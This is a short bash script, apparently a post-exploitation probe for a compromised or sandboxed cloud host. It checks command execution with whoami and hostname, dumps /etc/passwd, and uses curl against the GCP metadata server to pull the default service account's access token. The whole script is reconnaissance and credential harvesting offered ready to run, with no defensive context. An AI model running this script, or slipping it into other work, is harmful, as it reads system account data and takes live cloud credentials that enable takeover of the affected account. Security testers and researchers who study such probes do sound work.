#!/bin/bash

echo "[+] Checking basic command execution:"
whoami
hostname

echo "[+] /etc/passwd contents:"
cat /etc/passwd

echo "[+] Trying to access GCP metadata:"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
